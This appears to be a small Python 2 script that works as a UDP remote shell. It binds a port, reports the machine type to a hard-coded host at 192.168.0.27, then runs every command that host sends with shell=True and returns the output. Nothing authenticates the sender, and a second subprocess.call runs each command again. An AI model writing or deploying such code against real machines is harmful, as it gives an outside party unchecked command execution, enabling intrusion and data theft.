#!/usr/bin/env python2

import  socket
import  commands
import subprocess
from subprocess import PIPE 
#  we are looking for UDP (user datagram protocol )
#              ip_version4,         UDP 
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
# defining ip and port below 
ip="192.168.0.27"
port=7890
port2=8888
#  binind ip and port with bind function that takes input as tuple
s.bind(("",port))

msg = raw_input("Type your Machine either Windows or Linux : ")
s.sendto(msg,(ip,port2))

#  rec  data from  client 
while True:
#  only  accepting  commands with  20 char 
	client_data=s.recvfrom(20)
#   only  client  data is stored
	recv_cmd=client_data[0]
#  executing  client data 
	if  'exit' in recv_cmd or 'close' in  recv_cmd :
		print ("Closing Server ...")
		exit()
	else :
		popcorn = subprocess.Popen(recv_cmd, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
       	        out,err = popcorn.communicate()
        	s.sendto(out+err,(ip,port2))
        	subprocess.call([recv_cmd],shell=True)
        

s.close()

